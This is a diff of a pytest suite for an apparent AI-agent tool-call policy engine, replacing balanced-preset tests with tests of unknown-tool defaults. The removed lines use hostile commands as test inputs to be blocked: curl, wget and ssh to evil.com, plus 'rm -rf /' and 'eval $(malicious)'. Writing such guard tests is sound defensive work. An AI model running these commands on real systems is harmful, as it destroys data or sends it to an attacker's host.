@@ -1,450 +1,218 @@
-"""Tests for the policy engine, balanced preset tuning, and new features.
+"""Tests for unknown tool handling across all policy presets.
 
-Covers:
-- TAINT_LEVEL_LTE operator in models/engine
-- Balanced preset: benign command whitelist, taint gradients, read-only tools
-- command_safety_check cross-referencing
-- Evaluation caching
-- Clean terminal calls always allowed
+Verifies that unknown/new tools are handled securely:
+- PARANOID: deny unknown tools (both clean and tainted)
+- BALANCED: escalate tainted unknown, allow clean (catch-all)
+- PERMISSIVE: log_only for unknown tools
+- Flow analyzer: defaults to ASK_USER for unknown flows
+- Engine: preset-appropriate default_action when no policy matches
 """
 
 from __future__ import annotations
 
 import pytest
 
-from hermes_katana.policy.models import (
-    Condition,
-    ConditionOperator,
-    Policy,
-    PolicyResult,
-    PolicySet,
-)
-from hermes_katana.policy.engine import (
-    EvaluationResult,
-    PolicyEngine,
-    command_safety_check,
-    evaluate_condition,
-    _extract_base_command,
-    _is_benign_command,
-)
+from hermes_katana.policy.engine import PolicyEngine, EvaluationResult
+from hermes_katana.policy.models import PolicyResult
 
 
-# ---------------------------------------------------------------------------
-# Helpers
-# ---------------------------------------------------------------------------
+# ── Helpers ──────────────────────────────────────────────────────────────────
 
-def _taint(level: int = 5, source: str = "user_message") -> dict:
-    """Create a taint context with a single tainted field at the given level."""
-    return {
-        "tainted_fields": {
-            "command": {
-                "is_tainted": True,
-                "source": source,
-                "labels": ["untrusted"],
-                "readers": [],
-                "level": level,
-            }
+FAKE_TOOL = "super_duper_nonexistent_tool_xyz_9999"
+
+NO_TAINT: dict = {}
+
+TAINTED_CTX: dict = {
+    "tainted_fields": {
+        "content": {
+            "is_tainted": True,
+            "source": "web_content",
+            "labels": ["untrusted"],
+            "readers": [],
+            "level": 5,
         }
     }
+}
 
-
-def _clean() -> dict:
-    """Clean taint context (no taint)."""
-    return {}
-
-
-def _multi_field_taint(fields: dict[str, int]) -> dict:
-    """Create taint context with multiple fields at specified levels."""
-    return {
-        "tainted_fields": {
-            name: {
-                "is_tainted": True,
-                "source": "user_message",
-                "labels": ["untrusted"],
-                "readers": [],
-                "level": level,
-            }
-            for name, level in fields.items()
+HIGH_TAINT_CTX: dict = {
+    "tainted_fields": {
+        "content": {
+            "is_tainted": True,
+            "source": "web_content",
+            "labels": ["untrusted"],
+            "readers": [],
+            "level": 9,
         }
     }
+}
 
 
-# ---------------------------------------------------------------------------
-# Task 3: TAINT_LEVEL_LTE operator
-# ---------------------------------------------------------------------------
-
-class TestTaintLevelLTE:
-    """Test the new TAINT_LEVEL_LTE condition operator."""
-
-    def test_lte_true_when_level_below_threshold(self):
-        cond = Condition(field="*", operator=ConditionOperator.TAINT_LEVEL_LTE, value=3)
-        assert evaluate_condition(cond, {}, _taint(level=2)) is True
-
-    def test_lte_true_when_level_equals_threshold(self):
-        cond = Condition(field="*", operator=ConditionOperator.TAINT_LEVEL_LTE, value=3)
-        assert evaluate_condition(cond, {}, _taint(level=3)) is True
-
-    def test_lte_false_when_level_above_threshold(self):
-        cond = Condition(field="*", operator=ConditionOperator.TAINT_LEVEL_LTE, value=3)
-        assert evaluate_condition(cond, {}, _taint(level=4)) is False
-
-    def test_lte_with_clean_context_level_zero(self):
-        cond = Condition(field="*", operator=ConditionOperator.TAINT_LEVEL_LTE, value=3)
-        assert evaluate_condition(cond, {}, _clean()) is True  # level 0 <= 3
-
-    def test_lte_specific_field(self):
-        cond = Condition(field="command", operator=ConditionOperator.TAINT_LEVEL_LTE, value=5)
-        assert evaluate_condition(cond, {}, _taint(level=5)) is True
-        assert evaluate_condition(cond, {}, _taint(level=6)) is False
-
-    def test_gte_and_lte_combo_medium_range(self):
-        """Verify that GTE + LTE can express a range (4-6)."""
-        gte4 = Condition(field="*", operator=ConditionOperator.TAINT_LEVEL_GTE, value=4)
-        lte6 = Condition(field="*", operator=ConditionOperator.TAINT_LEVEL_LTE, value=6)
-
-        for level in [1, 2, 3]:
-            ctx = _taint(level=level)
-            assert not (evaluate_condition(gte4, {}, ctx) and evaluate_condition(lte6, {}, ctx))
-
-        for level in [4, 5, 6]:
-            ctx = _taint(level=level)
-            assert evaluate_condition(gte4, {}, ctx) and evaluate_condition(lte6, {}, ctx)
-
-        for level in [7, 8, 9, 10]:
-            ctx = _taint(level=level)
-            assert not (evaluate_condition(gte4, {}, ctx) and evaluate_condition(lte6, {}, ctx))
+# ══════════════════════════════════════════════════════════════════════════════
+# Task 1: Unknown tool defaults per preset
+# ══════════════════════════════════════════════════════════════════════════════
 
 
-# ---------------------------------------------------------------------------
-# Task 1: Balanced preset behavior
-# ---------------------------------------------------------------------------
+class TestParanoidUnknownTools:
+    """PARANOID preset must deny all unknown tools."""
 
-class TestBalancedPreset:
-    """Test the refined balanced preset policies."""
+    def setup_method(self):
+        self.engine = PolicyEngine.with_defaults("paranoid")
 
-    @pytest.fixture
-    def engine(self):
-        return PolicyEngine.with_defaults("balanced")
+    def test_unknown_tool_clean_is_denied(self):
+        result = self.engine.evaluate(FAKE_TOOL, {"arg": "hello"}, NO_TAINT)
+        assert result.action == PolicyResult.DENY
 
-    # -- Clean calls always allowed --
+    def test_unknown_tool_tainted_is_denied(self):
+        result = self.engine.evaluate(FAKE_TOOL, {"content": "x"}, TAINTED_CTX)
+        assert result.action == PolicyResult.DENY
 
-    def test_clean_terminal_allowed(self, engine):
-        result = engine.evaluate("terminal", {"command": "rm -rf /"}, _clean())
-        assert result.action == PolicyResult.ALLOW
+    def test_unknown_tool_high_taint_is_denied(self):
+        result = self.engine.evaluate(FAKE_TOOL, {"content": "x"}, HIGH_TAINT_CTX)
+        assert result.action == PolicyResult.DENY
 
-    def test_clean_write_file_allowed(self, engine):
-        result = engine.evaluate("write_file", {"path": "/tmp/x", "content": "hi"}, _clean())
-        assert result.action == PolicyResult.ALLOW
+    def test_default_action_is_deny(self):
+        assert self.engine.default_action == PolicyResult.DENY
 
-    # -- Read-only always allowed --
 
-    def test_read_file_always_allowed(self, engine):
-        result = engine.evaluate("read_file", {"path": "/etc/passwd"}, _taint(level=9))
-        assert result.action == PolicyResult.ALLOW
+class TestBalancedUnknownTools:
+    """BALANCED preset: escalate tainted unknown, allow clean unknown (catch-all)."""
 
-    def test_search_files_always_allowed(self, engine):
-        result = engine.evaluate("search_files", {"pattern": "password"}, _taint(level=8))
-        assert result.action == PolicyResult.ALLOW
+    def setup_method(self):
+        self.engine = PolicyEngine.with_defaults("balanced")
 
-    def test_browser_snapshot_always_allowed(self, engine):
-        result = engine.evaluate("browser_snapshot", {}, _taint(level=10))
-        assert result.action == PolicyResult.ALLOW
-
-    # -- Benign commands with low taint → ALLOW --
-
-    def test_benign_ls_low_taint_allowed(self, engine):
-        result = engine.evaluate("terminal", {"command": "ls -la /tmp"}, _taint(level=2))
-        assert result.action == PolicyResult.ALLOW
-
-    def test_benign_cat_low_taint_allowed(self, engine):
-        result = engine.evaluate("terminal", {"command": "cat /etc/hostname"}, _taint(level=1))
-        assert result.action == PolicyResult.ALLOW
-
-    def test_benign_echo_low_taint_allowed(self, engine):
-        result = engine.evaluate("terminal", {"command": "echo hello"}, _taint(level=3))
-        assert result.action == PolicyResult.ALLOW
-
-    def test_benign_python_low_taint_allowed(self, engine):
-        result = engine.evaluate("terminal", {"command": "python3 --version"}, _taint(level=1))
-        assert result.action == PolicyResult.ALLOW
-
-    def test_benign_git_status_low_taint_allowed(self, engine):
-        result = engine.evaluate("terminal", {"command": "git status"}, _taint(level=2))
-        assert result.action == PolicyResult.ALLOW
-
-    def test_benign_git_log_low_taint_allowed(self, engine):
-        result = engine.evaluate("terminal", {"command": "git log --oneline"}, _taint(level=3))
-        assert result.action == PolicyResult.ALLOW
-
-    def test_benign_pip_install_low_taint_allowed(self, engine):
-        result = engine.evaluate("terminal", {"command": "pip install requests"}, _taint(level=2))
-        assert result.action == PolicyResult.ALLOW
-
-    def test_benign_npm_install_low_taint_allowed(self, engine):
-        result = engine.evaluate("terminal", {"command": "npm install express"}, _taint(level=1))
-        assert result.action == PolicyResult.ALLOW
-
-    # -- Benign commands with medium taint → ESCALATE --
-
-    def test_benign_ls_medium_taint_escalated(self, engine):
-        result = engine.evaluate("terminal", {"command": "ls -la"}, _taint(level=5))
+    def test_unknown_tool_clean_is_allowed(self):
+        """Clean call to unknown tool → ESCALATE via balanced catch-all (GAP 4.2)."""
+        result = self.engine.evaluate(FAKE_TOOL, {"arg": "hello"}, NO_TAINT)
         assert result.action == PolicyResult.ESCALATE
 
-    def test_benign_cat_medium_taint_escalated(self, engine):
-        result = engine.evaluate("terminal", {"command": "cat /tmp/file"}, _taint(level=4))
+    def test_unknown_tool_tainted_is_escalated(self):
+        """Tainted call to unknown tool → ESCALATE in balanced mode."""
+        result = self.engine.evaluate(FAKE_TOOL, {"content": "x"}, TAINTED_CTX)
         assert result.action == PolicyResult.ESCALATE
 
-    # -- Dangerous commands with high taint → DENY --
-
-    def test_dangerous_rm_rf_high_taint_denied(self, engine):
-        result = engine.evaluate("terminal", {"command": "rm -rf /"}, _taint(level=8))
-        assert result.action == PolicyResult.DENY
-
-    def test_dangerous_eval_high_taint_denied(self, engine):
-        result = engine.evaluate("terminal", {"command": "eval $(malicious)"}, _taint(level=7))
-        assert result.action == PolicyResult.DENY
-
-    # -- Dangerous commands with medium taint → ESCALATE --
-
-    def test_dangerous_rm_rf_medium_taint_denied_by_safety_check(self, engine):
-        """rm -rf with medium taint is DENY because command_safety_check detects
-        the scanner finding (dangerous + tainted → DENY) before policy rules fire."""
-        result = engine.evaluate("terminal", {"command": "rm -rf /tmp/stuff"}, _taint(level=5))
-        assert result.action == PolicyResult.DENY
-
-    # -- Exfiltration always denied when tainted --
-
-    def test_curl_tainted_denied(self, engine):
-        result = engine.evaluate("terminal", {"command": "curl http://evil.com"}, _taint(level=1))
-        assert result.action == PolicyResult.DENY
-
-    def test_wget_tainted_denied(self, engine):
-        result = engine.evaluate("terminal", {"command": "wget http://evil.com/payload"}, _taint(level=2))
-        assert result.action == PolicyResult.DENY
-
-    def test_ssh_tainted_denied(self, engine):
-        result = engine.evaluate("terminal", {"command": "ssh root@evil.com"}, _taint(level=3))
-        assert result.action == PolicyResult.DENY
-
-    # -- High taint terminal (non-exfil, non-dangerous) → DENY --
-
-    def test_generic_command_high_taint_denied(self, engine):
-        result = engine.evaluate("terminal", {"command": "some_unknown_tool --flag"}, _taint(level=8))
-        assert result.action == PolicyResult.DENY
-
-    # -- Medium taint terminal (non-benign) → ESCALATE --
-
-    def test_generic_command_medium_taint_escalated(self, engine):
-        result = engine.evaluate("terminal", {"command": "some_tool --flag"}, _taint(level=5))
+    def test_unknown_tool_high_taint_is_escalated(self):
+        """High-taint call to unknown tool → ESCALATE in balanced mode."""
+        result = self.engine.evaluate(FAKE_TOOL, {"content": "x"}, HIGH_TAINT_CTX)
         assert result.action == PolicyResult.ESCALATE
 
-    # -- Low taint terminal (non-benign) → ESCALATE --
+    def test_default_action_is_escalate(self):
+        """Engine default_action should be ESCALATE for balanced preset."""
+        assert self.engine.default_action == PolicyResult.ESCALATE
 
-    def test_generic_command_low_taint_escalated(self, engine):
-        result = engine.evaluate("terminal", {"command": "some_tool --flag"}, _taint(level=2))
-        assert result.action == PolicyResult.ESCALATE
 
-    # -- Tainted read-only tools → LOG_ONLY --
+class TestPermissiveUnknownTools:
+    """PERMISSIVE preset must log_only for unknown tools."""
 
-    def test_tainted_vision_logged(self, engine):
-        result = engine.evaluate("vision_analyze", {"image_url": "http://x"}, _taint(level=3))
+    def setup_method(self):
+        self.engine = PolicyEngine.with_defaults("permissive")
+
+    def test_unknown_tool_clean_is_log_only(self):
+        result = self.engine.evaluate(FAKE_TOOL, {"arg": "hello"}, NO_TAINT)
         assert result.action == PolicyResult.LOG_ONLY
 
-    def test_tainted_todo_logged(self, engine):
-        result = engine.evaluate("todo", {}, _taint(level=5))
+    def test_unknown_tool_tainted_is_log_only(self):
+        result = self.engine.evaluate(FAKE_TOOL, {"content": "x"}, TAINTED_CTX)
         assert result.action == PolicyResult.LOG_ONLY
 
-    def test_tainted_process_logged(self, engine):
-        result = engine.evaluate("process", {"action": "list"}, _taint(level=2))
-        assert result.action == PolicyResult.LOG_ONLY
-
-    # -- High taint side-effects --
-
-    def test_write_file_high_taint_denied(self, engine):
-        result = engine.evaluate("write_file", {"path": "/x", "content": "x"}, _taint(level=8))
-        assert result.action == PolicyResult.DENY
-
-    def test_patch_high_taint_denied(self, engine):
-        result = engine.evaluate("patch", {"path": "/x", "old_string": "a", "new_string": "b"}, _taint(level=9))
-        assert result.action == PolicyResult.DENY
-
-    def test_delegate_high_taint_denied(self, engine):
-        result = engine.evaluate("delegate_task", {"goal": "do evil"}, _taint(level=7))
-        assert result.action == PolicyResult.DENY
-
-    # -- Catchall high taint → ESCALATE --
-
-    def test_unknown_tool_high_taint_escalated(self, engine):
-        result = engine.evaluate("some_new_tool", {"arg": "val"}, _taint(level=8))
-        assert result.action == PolicyResult.ESCALATE
-
-    # -- Catchall low taint → LOG_ONLY --
-
-    def test_unknown_tool_low_taint_logged(self, engine):
-        result = engine.evaluate("some_new_tool", {"arg": "val"}, _taint(level=2))
-        assert result.action == PolicyResult.LOG_ONLY
+    def test_default_action_is_log_only(self):
+        assert self.engine.default_action == PolicyResult.LOG_ONLY
 
 
-# ---------------------------------------------------------------------------
-# Task 2: command_safety_check
-# ---------------------------------------------------------------------------
-
-class TestCommandSafetyCheck:
-    """Test the command_safety_check cross-reference function."""
-
-    def test_clean_command_always_allowed(self):
-        assert command_safety_check("rm -rf /", _clean()) == PolicyResult.ALLOW
-
-    def test_benign_low_taint_allowed(self):
-        assert command_safety_check("ls -la", _taint(level=2)) == PolicyResult.ALLOW
-
-    def test_benign_medium_taint_escalated(self):
-        assert command_safety_check("ls -la", _taint(level=5)) == PolicyResult.ESCALATE
-
-    def test_unknown_command_tainted_escalated(self):
-        assert command_safety_check("some_tool --arg", _taint(level=3)) == PolicyResult.ESCALATE
-
-    def test_dangerous_command_tainted_denied(self):
-        """If scanner detects danger + tainted → DENY.
-
-        Note: This test may ESCALATE if the scanner is not available or
-        doesn't flag the command. The important thing is it's never ALLOW.
-        """
-        result = command_safety_check("rm -rf /", _taint(level=8))
-        assert result in (PolicyResult.DENY, PolicyResult.ESCALATE)
+# ══════════════════════════════════════════════════════════════════════════════
+# Known tools still work correctly
+# ══════════════════════════════════════════════════════════════════════════════
 
 
-class TestExtractBaseCommand:
-    """Test the _extract_base_command helper."""
+class TestKnownToolsUnchanged:
+    """Ensure known tools still get their expected policy results."""
 
-    def test_simple_command(self):
-        assert _extract_base_command("ls -la") == "ls"
-
-    def test_with_sudo(self):
-        assert _extract_base_command("sudo rm -rf /") == "rm"
-
-    def test_with_path(self):
-        assert _extract_base_command("/usr/bin/python3 script.py") == "python3"
-
-    def test_with_env_var(self):
-        assert _extract_base_command("FOO=bar ls") == "ls"
-
-    def test_empty(self):
-        assert _extract_base_command("") == ""
-
-
-class TestIsBenignCommand:
-    """Test the _is_benign_command helper."""
-
-    def test_ls_is_benign(self):
-        assert _is_benign_command("ls -la /tmp") is True
-
-    def test_cat_is_benign(self):
-        assert _is_benign_command("cat /etc/hostname") is True
-
-    def test_git_status_is_benign(self):
-        assert _is_benign_command("git status") is True
-
-    def test_git_log_is_benign(self):
-        assert _is_benign_command("git log --oneline") is True
-
-    def test_git_push_not_benign(self):
-        assert _is_benign_command("git push origin main") is False
-
-    def test_git_commit_not_benign(self):
-        assert _is_benign_command("git commit -m 'msg'") is False
-
-    def test_curl_not_benign(self):
-        assert _is_benign_command("curl http://example.com") is False
-
-    def test_rm_not_benign(self):
-        assert _is_benign_command("rm -rf /") is False
-
-    def test_pip_is_benign(self):
-        assert _is_benign_command("pip install requests") is True
-
-    def test_npm_is_benign(self):
-        assert _is_benign_command("npm install express") is True
-
-
-# ---------------------------------------------------------------------------
-# Task 2: Evaluation caching
-# ---------------------------------------------------------------------------
-
-class TestEvaluationCaching:
-    """Test the policy evaluation cache."""
-
-    def test_cache_returns_same_result(self):
+    def test_balanced_clean_terminal_allowed(self):
         engine = PolicyEngine.with_defaults("balanced")
-        r1 = engine.evaluate("terminal", {"command": "ls"}, _clean())
-        r2 = engine.evaluate("terminal", {"command": "ls"}, _clean())
-        assert r1.action == r2.action
-        assert r1.reason == r2.reason
+        result = engine.evaluate("terminal", {"command": "ls"}, NO_TAINT)
+        assert result.action == PolicyResult.ALLOW
 
-    def test_cache_invalidated_on_add_policy(self):
+    def test_balanced_clean_read_file_allowed(self):
         engine = PolicyEngine.with_defaults("balanced")
-        r1 = engine.evaluate("terminal", {"command": "ls"}, _clean())
-        assert r1.action == PolicyResult.ALLOW
+        result = engine.evaluate("read_file", {"path": "/tmp/x"}, NO_TAINT)
+        assert result.action == PolicyResult.ALLOW
 
-        # Add a deny-all policy
-        engine.add_policy(Policy(
-            name="deny_all",
-            tool_pattern="*",
-            conditions=[],
-            action=PolicyResult.DENY,
-            priority=9999,
-        ))
-        r2 = engine.evaluate("terminal", {"command": "ls"}, _clean())
-        assert r2.action == PolicyResult.DENY
-
-    def test_cache_invalidated_on_remove_policy(self):
-        engine = PolicyEngine.with_defaults("balanced")
-        # Evaluate to populate cache
-        engine.evaluate("terminal", {"command": "ls"}, _clean())
-        # Remove and check cache is invalidated
-        engine.remove_policy("balanced_terminal_clean")
-        # Cache should be cleared, fresh evaluation
-        r = engine.evaluate("terminal", {"command": "ls"}, _clean())
-        # Still may ALLOW from another policy or default, but cache was cleared
-        assert isinstance(r, EvaluationResult)
-
-    def test_different_args_different_cache_entries(self):
-        engine = PolicyEngine.with_defaults("balanced")
-        r1 = engine.evaluate("terminal", {"command": "ls"}, _clean())
-        r2 = engine.evaluate("terminal", {"command": "curl http://evil.com"}, _taint(level=5))
-        assert r1.action != r2.action
-
-    def test_cache_eviction_does_not_crash(self):
-        """Ensure cache eviction at capacity doesn't error."""
-        engine = PolicyEngine.with_defaults("balanced")
-        engine._EVAL_CACHE_MAX = 10  # Low limit for test
-        for i in range(20):
-            engine.evaluate("terminal", {"command": f"cmd_{i}"}, _clean())
-        assert len(engine._eval_cache) <= 10
-
-
-# ---------------------------------------------------------------------------
-# Paranoid and Permissive presets still load
-# ---------------------------------------------------------------------------
-
-class TestOtherPresets:
-    def test_paranoid_loads(self):
+    def test_paranoid_tainted_terminal_denied(self):
         engine = PolicyEngine.with_defaults("paranoid")
-        assert engine.policy_count > 0
+        result = engine.evaluate("terminal", {"command": "ls"}, TAINTED_CTX)
+        assert result.action == PolicyResult.DENY
 
-    def test_permissive_loads(self):
+    def test_permissive_clean_terminal_log_only(self):
+        """Clean terminal in permissive hits catchall → log_only."""
         engine = PolicyEngine.with_defaults("permissive")
-        assert engine.policy_count > 0
+        result = engine.evaluate("terminal", {"command": "ls"}, NO_TAINT)
+        assert result.action == PolicyResult.LOG_ONLY
 
-    def test_balanced_loads(self):
+    def test_balanced_clean_notes_allowed(self):
+        """Clean notes call → ALLOW via explicit balanced_notes_clean policy."""
         engine = PolicyEngine.with_defaults("balanced")
-        assert engine.policy_count > 0
+        result = engine.evaluate("notes", {"text": "Meeting notes"}, NO_TAINT)
+        assert result.action == PolicyResult.ALLOW
+
+    def test_balanced_tainted_notes_denied(self):
+        """Tainted notes in balanced should be denied (explicit policy)."""
+        engine = PolicyEngine.with_defaults("balanced")
+        result = engine.evaluate("notes", {"text": "x"}, TAINTED_CTX)
+        assert result.action == PolicyResult.DENY
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+# Task 2: Flow analyzer defaults
+# ══════════════════════════════════════════════════════════════════════════════
+
+
+class TestFlowAnalyzerDefaults:
+    """Flow analyzer should default to ASK_USER (fail-closed)."""
+
+    def test_default_decision_is_ask_user(self):
+        from hermes_katana.taint.flow import FlowAnalyzer, FlowDecision
+        analyzer = FlowAnalyzer(rules=[])
+        assert analyzer._default == FlowDecision.ASK_USER
+
+    def test_default_decision_with_default_rules(self):
+        from hermes_katana.taint.flow import FlowAnalyzer, FlowDecision
+        analyzer = FlowAnalyzer()
+        assert analyzer._default == FlowDecision.ASK_USER
+
+    def test_strict_mode_is_ask_user(self):
+        from hermes_katana.taint.flow import FlowAnalyzer, FlowDecision
+        analyzer = FlowAnalyzer(strict_mode=True)
+        assert analyzer._default == FlowDecision.ASK_USER
+
+    def test_explicit_allow_override_works(self):
+        from hermes_katana.taint.flow import FlowAnalyzer, FlowDecision
+        analyzer = FlowAnalyzer(default_decision=FlowDecision.ALLOW)
+        assert analyzer._default == FlowDecision.ALLOW
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+# Engine preset defaults
+# ══════════════════════════════════════════════════════════════════════════════
+
+
+class TestEnginePresetDefaults:
+    """Engine.with_defaults sets appropriate default_action per preset."""
+
+    def test_paranoid_default_deny(self):
+        engine = PolicyEngine.with_defaults("paranoid")
+        assert engine.default_action == PolicyResult.DENY
+
+    def test_balanced_default_escalate(self):
+        engine = PolicyEngine.with_defaults("balanced")
+        assert engine.default_action == PolicyResult.ESCALATE
+
+    def test_permissive_default_log_only(self):
+        engine = PolicyEngine.with_defaults("permissive")
+        assert engine.default_action == PolicyResult.LOG_ONLY
+
+    def test_custom_engine_default_allow(self):
+        engine = PolicyEngine()
+        assert engine.default_action == PolicyResult.ALLOW
 
     def test_invalid_preset_raises(self):
         with pytest.raises(ValueError, match="Unknown preset"):
             PolicyEngine.with_defaults("nonexistent")
-
-    def test_balanced_version_is_2(self):
-        """Confirm balanced was upgraded to v2."""
-        from hermes_katana.policy.defaults import BALANCED_POLICIES
-        assert BALANCED_POLICIES["version"] == "2.0.0"
